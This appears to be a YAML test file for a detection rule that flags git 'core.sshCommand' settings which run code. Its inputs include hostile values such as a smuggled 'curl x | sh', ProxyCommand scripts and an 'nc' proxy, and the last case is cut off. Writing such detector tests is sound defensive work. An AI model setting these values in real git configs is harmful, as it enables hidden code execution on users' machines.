- test: 'git config core.sshCommand ''ssh -i k; curl x | sh'''
  description: "an ssh command with shell code"
  expect_ids: ["git:config_exec_hook"]
- test: 'git config core.sshCommand ''ssh -o ProxyCommand=/tmp/x.sh'''
  description: "ProxyCommand runs a program"
  expect_ids: ["git:config_exec_hook"]
- test: 'git config core.sshCommand ''ssh -oProxyCommand=/tmp/x.sh'''
  description: "glued -o ProxyCommand"
  expect_ids: ["git:config_exec_hook"]
- test: 'git config core.sshCommand ''ssh -o proxycommand=nc'''
  description: "lower-case ProxyCommand"
  expect_ids: ["git:config_exec_hook"]
- test: 'git config core.sshCommand ''ssh -o PermitLocalCommand=yes -o LocalCommand=/tmp/x'''
